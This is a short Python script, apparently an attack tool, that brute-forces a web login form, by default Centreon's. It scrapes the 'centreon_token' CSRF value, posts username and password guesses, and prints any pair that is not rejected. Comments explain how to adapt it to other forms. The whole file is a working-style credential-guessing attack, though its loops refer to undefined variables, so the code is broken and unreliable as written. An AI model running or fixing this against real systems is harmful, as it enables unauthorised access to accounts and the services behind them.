import requests ,sys
from lxml import html

username_list=sys.argv[1]
password_list=sys.argv[2]
url_path=sys.argv[3]

for usernames in username:
   for each in password:
         
         req=requests.get(url_path)
         tree=html.fromstring(req.text)
         #change the name of csrf token and replace  it with "centreon_token" in below line
         #change the name of the contents in "infp" variable
         csrf_token=list(set(tree.xpath("//input[@name='centreon_token']/@value")))[0]
         infp={'useralias':username,'password':each,'centreon_token':csrf_token,'submitLogin':'Connect'}
         req_1=requests.post(url_path,data=infp)
         if("Your credentials are incorrect."  not in req_1.text):
                    print(username,each,csrf_token)
                    break
         
    


    
